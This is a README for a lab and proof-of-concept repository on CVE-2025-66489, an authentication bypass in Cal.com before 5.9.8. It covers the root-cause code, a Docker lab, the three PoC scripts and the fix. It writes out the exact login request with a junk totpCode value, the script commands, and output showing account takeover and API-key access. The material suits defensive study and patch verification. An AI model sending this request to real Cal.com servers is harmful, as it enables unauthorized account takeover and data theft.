# CVE-2025-66489 - Cal.com Authentication Bypass via TOTP Code Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-66489 |
| Component | [Cal.com](https://github.com/calcom/cal.com) |
| Type | CWE-303: Incorrect Implementation of Authentication Algorithm |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.1% (35.5th percentile) |
| Affected | Cal.com < 5.9.8 |
| Fix | Upgrade to v5.9.8+ (commit `63d1361a7a`) |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

Cal.com versions prior to 5.9.8 contain a critical authentication bypass vulnerability in the NextAuth credentials provider. By including any truthy value in the `totpCode` field during login, an attacker can completely skip password verification and gain full access to any user account that does not have two-factor authentication enabled. The attack requires only knowledge of a valid email address — no password, no valid TOTP code, and no prior authentication.

### Root Cause

The vulnerability resides in the `authorize()` function within `packages/features/auth/lib/next-auth-options.ts`. Password verification is conditionally gated on the absence of a `totpCode` field in the login request:

```typescript
// Line 179 in v5.9.7 — VULNERABLE
if (user.password?.hash && !credentials.totpCode) {
    // Password verification ONLY happens inside this block
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

When an attacker includes **any truthy value** in the `totpCode` field (e.g., `"000000"`, `"x"`, `" "`), the condition `!credentials.totpCode` evaluates to `false`, and the **entire password verification block is skipped**. The code then falls through to the 2FA verification section, which only executes when `user.twoFactorEnabled` is `true`. For the majority of users who do not have 2FA enabled, **no authentication check occurs at all**, and login succeeds unconditionally.

Additionally, the code at line 172 contains a similar flaw: `if (!user.password?.hash && user.identityProvider !== IdentityProvider.CAL && !credentials.totpCode)` — the `!credentials.totpCode` condition allows bypassing this guard as well. There is also dead code at line 180 (`if (!user.password?.hash)` inside a block that already requires `user.password?.hash` to be truthy), indicating the authentication logic was poorly constructed.

## Affected Versions

| Version | Status |
|---------|--------|
| **< 5.9.8** | Vulnerable |
| **5.9.7** | Last vulnerable release |
| **5.9.8** | First patched release |

## Lab Setup

### Prerequisites

- Docker with compose plugin (`docker compose`)
- ~1-2 GB free RAM (Cal.com is a large Node.js application)
- The `cve-2025-66489-vulnerable:latest` Docker image (pre-built from Cal.com v5.9.7 source)

**Note:** The Dockerfile.vulnerable references the Cal.com source tree as build context. Since the source is not included in this repository (it is a large monorepo), the Docker image must be pre-built. The docker-compose.yml already references the pre-built image.

### Architecture

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-66489-db` | `postgres:15-bookworm` | PostgreSQL 15 database | 5432 (internal) |
| `cve-2025-66489-vulnerable` | `cve-2025-66489-vulnerable:latest` | Cal.com v5.9.7 web app | 3000 |

### Quick Start

```bash
cd CVE-2025-66489

# Start the lab containers
docker compose up -d

# Wait for the vulnerable container to become healthy (~60-90 seconds)
docker compose ps

# Seed the test user (run after the vulnerable container is healthy)
bash seed-test-user.sh
```

### Test User

| Field | Value |
|-------|-------|
| **Email** | `victim@example.com` |
| **Password** | `Password123!` |
| **Identity Provider** | `CAL` |
| **2FA Enabled** | `false` |

### Stop & Reset

```bash
# Stop the lab
docker compose down

# Full reset (including database data)
docker compose down -v
```

## PoC Usage

Three self-contained Python 3 PoC scripts are provided in the `poc/` directory. All use only the Python standard library (`urllib`, `json`, `sys`) — no external dependencies required.

### PoC 1: Primary Authentication Bypass (`poc.py`)

Demonstrates the core vulnerability with a controlled baseline comparison and session verification.

```bash
python3 poc/poc.py <TARGET_IP> <PORT> <VICTIM_EMAIL>
```

**Example:**
```bash
python3 poc/poc.py localhost 3000 victim@example.com
```

**Expected output:**
```
  Normal login (wrong password, no totpCode): FAILED (correct)
  Bypass login (wrong password + totpCode):   SUCCEEDED
  Session valid:                              YES

  CVE-2025-66489 CONFIRMED — Authentication bypass demonstrated
```

### PoC 2: Edge-Case totpCode Values (`poc_vector2_minimal_totp.py`)

Tests 6 different edge-case `totpCode` values plus a negative control to confirm the bypass is triggered by JavaScript truthy/falsy semantics.

```bash
python3 poc/poc_vector2_minimal_totp.py <TARGET_IP> <PORT> <VICTIM_EMAIL>
```

**Expected output:**
```
  totpCode='x'          → BYPASS   [HTTP 200]
  totpCode='0'          → BYPASS   [HTTP 200]
  totpCode='false'      → BYPASS   [HTTP 200]
  totpCode=' '          → BYPASS   [HTTP 200]
  totpCode='999999'     → BYPASS   [HTTP 200]
  totpCode='a]b[c'      → BYPASS   [HTTP 200]

  Negative controls (should NOT bypass):
  totpCode=''           → BLOCKED  [HTTP 401]

  CONFIRMED: ANY truthy totpCode value bypasses password check
```

### PoC 3: Full Account Takeover (`poc_vector3_session_hijack.py`)

Demonstrates complete account takeover by bypassing authentication and then accessing 6 sensitive API endpoints.

```bash
python3 poc/poc_vector3_session_hijack.py <TARGET_IP> <PORT> <VICTIM_EMAIL>
```

**Expected output:**
```
  [2a] Session Info (/api/auth/session):            Status 200
  [2b] User Profile (tRPC me/get):                  Status 200
  [2c] Event Types (tRPC eventTypes/getByViewer):   Status 200
  [2d] Bookings (tRPC bookings/get):                Status 200
  [2e] Availability (tRPC availability/list):       Status 200
  [2f] API Keys (tRPC apiKeys/list):                Status 200

  FULL ACCOUNT TAKEOVER CONFIRMED
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (v5.9.7) | Patched (v5.9.8+) |
|------|---------------------|-------------------|
| Login with correct password, no `totpCode` | Succeeds (HTTP 200) | Succeeds (HTTP 200) |
| Login with **wrong** password, no `totpCode` | Rejected (HTTP 401) | Rejected (HTTP 401) |
| Login with **wrong** password + `totpCode=000000` | **Succeeds (HTTP 200)** — BYPASS | Rejected (HTTP 401) — FIXED |
| Session after bypass | Full user session returned | No session — login failed |

The **only difference** between the normal login and the bypass is the presence of a `totpCode` field. On the vulnerable version, this causes the password check to be entirely skipped. On the patched version, password verification is unconditional and the bypass no longer works.

### Exploit Flow

```
1. GET  /api/auth/csrf
   → {"csrfToken": "<token>"}

2. POST /api/auth/callback/credentials
   Content-Type: application/x-www-form-urlencoded
   Body: email=victim@example.com&password=ANYTHING&totpCode=000000&csrfToken=<token>&json=true

   Server-side flow (v5.9.7):
   a) User lookup by email → found
   b) Line 179: user.password?.hash && !credentials.totpCode
      → true && !"000000" → true && false → FALSE
      → PASSWORD CHECK SKIPPED ← vulnerability
   c) Line 215: user.twoFactorEnabled → false → 2FA check skipped
   d) Authentication succeeds → session token returned

   → HTTP 200 + Set-Cookie: next-auth.session-token=<jwt>

3. GET /api/auth/session (with stolen session cookie)
   → {"user": {"name": "Victim User", "email": "victim@example.com", ...}}
```

## Fix

The fix was applied in commit [`63d1361a7a`](https://github.com/calcom/cal.com/commit/63d1361a7a999e7613a55d4fefbf6dbabab9eb11) (PR [#25563](https://github.com/calcom/cal.com/pull/25563)), released in **v5.9.8**.

The fix replaces the flawed conditional logic with unconditional password verification:

**Before (vulnerable — v5.9.7):**
```typescript
if (!user.password?.hash && user.identityProvider !== IdentityProvider.CAL && !credentials.totpCode) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
if (!user.password?.hash && user.identityProvider == IdentityProvider.CAL) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
if (user.password?.hash && !credentials.totpCode) {
    if (!user.password?.hash) {  // Dead code — never true
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

**After (fixed — v5.9.8):**
```typescript
// Users without a password must use their identity provider to login
if (!user.password?.hash) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}

// Always verify password for users who have one
const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
if (!isCorrectPassword) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
```

**Key improvements:**
1. **Removed all `credentials.totpCode` conditions** from the password verification path — the `totpCode` field can no longer influence whether password checking occurs
2. **Password verification is now unconditional** — every user with a password hash must pass `verifyPassword()`, regardless of other request fields
3. **Eliminated dead code** — the unreachable inner `!user.password?.hash` check is removed
4. **2FA flow preserved** — TOTP/backup code verification still runs independently as an additional factor after the password check

**Fix assessment: COMPLETE.** No bypass vectors were identified. The fix addresses the root cause at the correct architectural level.

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — authentication bypass with baseline comparison and session verification |
| `poc/poc_vector2_minimal_totp.py` | Vector 2 — edge-case totpCode value testing (truthy/falsy semantics) |
| `poc/poc_vector3_session_hijack.py` | Vector 3 — full account takeover via 6 sensitive API endpoints |
| `Dockerfile.vulnerable` | Cal.com v5.9.7 multi-stage build (requires source tree as context) |
| `docker-compose.yml` | Multi-container lab orchestration (PostgreSQL + Cal.com) |
| `seed-test-user.sh` | Seeds `victim@example.com` test user into the database |
| `seed-user.sql` | SQL reference for test user creation |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results across all three vectors |

## References

- [Security Advisory (GHSA-9r3w-4j8q-pw98)](https://github.com/calcom/cal.com/security/advisories/GHSA-9r3w-4j8q-pw98)
- [Fix Commit](https://github.com/calcom/cal.com/commit/63d1361a7a999e7613a55d4fefbf6dbabab9eb11)
- [Fix Pull Request #25563](https://github.com/calcom/cal.com/pull/25563)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-66489)
- [Cal.com Repository](https://github.com/calcom/cal.com)

## Timeline

| Date | Event |
|------|-------|
| 2025-12-03 | CVE-2025-66489 published |
| v5.9.7 | Last vulnerable release (commit `8167fe0d05`) |
| v5.9.8 | First patched release (fix commit `63d1361a7a`) |
| 2026-02-28 | Lab reproduction and PoC verification completed |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-66489 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
